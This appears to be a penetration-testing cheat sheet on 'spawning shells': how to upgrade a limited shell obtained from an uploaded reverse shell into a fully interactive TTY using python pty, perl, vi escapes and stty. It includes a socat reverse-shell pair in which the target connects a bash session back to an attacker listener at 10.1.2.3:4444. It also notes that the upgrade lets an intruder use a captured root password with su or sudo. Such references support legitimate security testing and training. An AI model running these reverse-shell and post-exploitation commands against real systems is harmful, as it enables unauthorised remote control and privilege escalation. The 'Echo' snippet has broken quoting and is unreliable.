# Spawning shells



## Non-interactive tty-shell

If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don't interact with the system has humans do. 

So if you don't have a tty-shell you can't run `su`, `sudo` for example. This can be annoying if you manage to get a root password but you can't use it.

Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods:



**Using python**

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

**Echo**

```
echo 'os.system('/bin/bash')'
```

**sh**

```
/bin/sh -i
```

**bash**

```
/bin/bash -i
```

**Perl**

```
perl -e 'exec "/bin/sh";'
```

**From within VI**

```
:!bash
```

## Interactive tty-shell

So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions.

_old ref: https://github.com/cornerpirate/socat-shell_

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

**python**
```
python -c 'import pty; pty.spawn("/bin/bash")'  
```

**sockat**
```bash
# attacker (listen):
socat file:$(tty),raw,echo=0 tcp-listen:4444  

# target (connect):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.1.2.3:4444
```

**stty**
```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ export TERM=xterm-256color

# optionally, if you have troubles using term, you can reset it completely and set it again
# to get information about the TERM
$ echo $TERM
xterm-256color
$ stty -a
speed 38400 baud; rows 24; columns 80; line=0;
intr=\^C; ...
...
# you need previous information to set new term
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```


## References:

http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password
http://netsec.ws/?p=337
http://pentestmonkey.net/blog/post-exploitation-without-a-tty
